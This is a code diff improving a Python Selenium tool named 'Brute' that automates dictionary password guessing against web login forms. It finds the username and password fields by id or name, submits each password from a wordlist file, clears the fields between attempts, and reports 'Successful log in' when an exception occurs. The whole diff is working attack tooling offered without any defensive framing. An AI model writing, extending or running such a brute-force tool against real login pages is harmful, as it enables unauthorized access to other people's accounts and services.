@@ -4,14 +4,15 @@ import re
 from win32com.client import Dispatch
 import os
 import zipfile
-import selenium
 from selenium import webdriver
 import time
+from selenium.webdriver.common.keys import Keys
 
 class Brute:
     def __init__(self):
         self.url = ''
         self.txtfle = ''
+        self.currentpswd = ''
 
     def set_url(self, url):
         self.url = url
@@ -98,7 +99,7 @@ class Brute:
         chromoptions.add_argument("--disable-extensions")
         chromoptions.add_argument("--disable-popup-blocking")
         driver.get(self.url)
-        time.sleep(3)
+        time.sleep(5)
 
         inpvars = self.get_input_vars(driver.page_source)
 
@@ -107,28 +108,66 @@ class Brute:
         self.txtfle = (self.txtfle).replace('.txt', '')
 
         dicfile = open(f'dictionaries/{self.txtfle}.txt', 'r')
-        if inpvars["usernameid"] == None:
+
+        useusernameid = False
+        usepasswordid = False
+        useformid = False
+
+        if inpvars["usernameid"] == None or inpvars["usernameid"] == "None":
             usernamelocate = inpvars["usernamename"]
+            useusernameid = False
         else:
             usernamelocate = inpvars["usernameid"]
+            useusernameid = True
 
-        if inpvars["passwordid"] == None:
+        if inpvars["passwordid"] == None or inpvars["passwordid"] == "None":
             passwordlocate = inpvars["passwordname"]
+            usepasswordid = False
         else:
             passwordlocate = inpvars["passwordid"]
+            usepasswordid = True
 
-        if inpvars["formid"] == None:
+        if inpvars["formid"] == None or inpvars["formid"] == "None":
             formlocate = inpvars["formname"]
+            useformid = False
         else:
             formlocate = inpvars["formid"]
+            useformid = True
 
         for pswd in dicfile:
+            self.currentpswd = pswd
             try:
-                driver.find_element_by_id(usernamelocate).send_keys(usrnm)
-                driver.find_element_by_id(passwordlocate).send_keys(pswd)
-                driver.find_element_by_id(formlocate).submit()
-                driver.find_element_by_id(usernamelocate).clear()
-                driver.find_element_by_id(passwordlocate).clear()
+                if useusernameid:
+                    driver.find_element_by_id(usernamelocate).send_keys(usrnm)
+                else:
+                    driver.find_element_by_name(usernamelocate).send_keys(usrnm)
+                
+                if usepasswordid:
+                    driver.find_element_by_id(passwordlocate).send_keys(pswd)
+                else:
+                    driver.find_element_by_name(passwordlocate).send_keys(pswd)
+
+                if useformid:
+                    driver.find_element_by_id(formlocate).submit()
+                else:
+                    driver.find_element_by_name(formlocate).submit()
+                
+
+                if useusernameid:
+                    userelement = driver.find_element_by_id(usernamelocate)
+                else:
+                    userelement = driver.find_element_by_name(usernamelocate)
+
+                userelement.send_keys(Keys.CONTROL + "a")
+                userelement.send_keys(Keys.DELETE)
+
+                if usepasswordid:
+                    passelement = driver.find_element_by_id(passwordlocate)
+                else:
+                    passelement = driver.find_element_by_name(passwordlocate)
+                passelement.send_keys(Keys.CONTROL + "a")
+                passelement.send_keys(Keys.DELETE)
+
             except:
                 print("Successful log in")
                 time.sleep(100000)
